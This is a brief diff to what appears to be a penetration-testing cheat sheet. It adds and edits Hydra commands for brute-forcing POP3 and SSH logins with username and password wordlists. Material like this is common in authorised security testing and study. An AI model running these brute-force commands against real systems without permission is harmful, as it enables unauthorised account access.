@@ -16,5 +16,6 @@ hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
 						SSH
 				
 				Wordlist Password
+hydra -l username -P WORDLIST
 				Wordlist Username and Password
-hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip sshe
+hydra -L users.txt -P passwords.txt -t 1 -u $ip sshe
